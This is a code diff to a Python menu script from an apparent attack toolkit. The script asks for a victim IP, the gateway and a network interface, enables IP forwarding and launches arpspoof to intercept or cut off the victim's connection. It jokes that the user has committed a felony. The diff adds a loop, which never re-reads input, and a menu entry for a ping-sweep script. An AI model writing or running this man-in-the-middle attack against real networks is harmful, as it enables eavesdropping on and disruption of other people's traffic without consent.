@@ -14,42 +14,50 @@ print(r"""
 
 print(r"""
 a) Start
-b) Coming in the future
+b) Coming Soon
+
+----------
+Helpful Scripts (run with ./SCRIPTNAME):
+pingsweep.sh
 
 ----------
 
-q) Quit")
-            """)
+q) Quit
+
+
+----------         """)
 
 statement = input("").lower()
+while True:
+    if statement == 'a':
+        os.system('echo ''')
+        print("For this attack to work, you must be on the same network and subnet as your target!")
+        os.system('echo ''')
+        os.system('echo ----------')
+        os.system('route -n')
+        os.system('echo ----------')
 
-if statement == 'a':
-    os.system('echo ''')
-    print("For this attack to work, you must be on the same network and subnet as your target!")
-    os.system('echo ''')
-    os.system('echo ----------')
-    os.system('route -n')
-    os.system('echo ----------')
+        print("Enter the network's Default Gateway (listed above)")
+        defaultgateway = input("")
 
-    print("Enter the network's Default Gateway (listed above)")
-    defaultgateway = input("")
+        os.system('echo ''')
+        os.system('echo Enter Victim IP')
+        victimip = input("")
 
-    os.system('echo ''')
-    os.system('echo Enter Victim IP')
-    victimip = input("")
+        os.system('echo ''')
+        os.system('echo Enter Your network interface name, ex wlan0, also listed above')
 
-    os.system('echo ''')
-    os.system('echo Enter Your network interface name, ex wlan0, also listed above')
+        interfacename = input("")
+        os.system('echo ''')
 
-    interfacename = input("")
-    os.system('echo ''')
+        os.system('echo If you see Mac Addresses flying around, then congrats you commited a felony... and are now nuking your targets connection')
+        os.system('echo ''')
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        os.system('arpspoof -i '+ interfacename + ' -t ' + victimip + ' -r '+ defaultgateway)
 
-    os.system('echo If you see Mac Addresses flying around, then congrats you commited a felony... and are now nuking your targets connection')
-    os.system('echo ''')
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    os.system('arpspoof -i '+ interfacename + ' -t ' + victimip + ' -r '+ defaultgateway)
-elif statement == 'q':
+
+    elif statement == 'q':
         exec(open('Modules/attack/Attack.py').read()) 
 
-else:
-    print ("Incorrect Option")
+    else:
+        print ("Incorrect Option")
